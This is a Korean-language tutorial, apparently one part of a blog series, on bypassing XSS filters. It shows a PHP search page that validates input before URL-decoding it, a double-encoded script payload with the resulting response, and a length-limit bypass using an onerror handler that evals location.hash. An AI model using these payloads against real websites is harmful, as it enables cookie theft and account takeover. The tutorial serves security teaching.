1,2편을 보고오시면 이해가 잘됩니다

![아아아](https://kr.object.ncloudstorage.com/dreamhack-content/page/d93ebd8d44183538e008843f2b814271ccc49795238660d115d82b335312954d.jpg)
# 잘못된 전처리
이번엔 디코딩등의 전처리 작업을 입력검증보다 늦게 수행할때 고려해볼 수 있는 우회방법이다.

예를들어
``` PHP
<?php
$query = $_GET["query"];
if (stripos($query, "<script>") !== FALSE) {
    header("HTTP/1.1 403 Forbidden");
    die("XSS attempt detected: " . htmlspecialchars($query, ENT_QUOTES|ENT_HTML5, "UTF-8"));
}
...
$searchQuery = urldecode($_GET["query"]);
?>
<h1>Search results for: <?php echo $searchQuery; ?></h1>
```
PHP 코드가 이렇게 작성되었다면 %253C 를 입력하여 입력검증후 %3c 가되어 결과적으로 < 가 되게된다.
이를 응용하면
``` JS
OST /search?query=%253Cscript%253Ealert(document.cookie)%253C/script%253E HTTP/1.1
-----
HTTP/1.1 200 OK
<h1>Search results for: <script>alert(document.cookie)</script></h1>
```
이렇게 된당
# 길이제한
아예 코드길이를 제한하는 경우도 있는데 이러한 경우 location.hash를 이용해 우회할 수 있다. 코드를 보며 설명하자면
``` 
https://example.com/?q=<img onerror="eval(location.hash.slice(1))">#alert(document.cookie);
```
먼저 URL에 이런식으로 넣으면 HASH함수의 결과로 onerror="alert(document.cookie);"가 되어 우회할 수 있게된다.
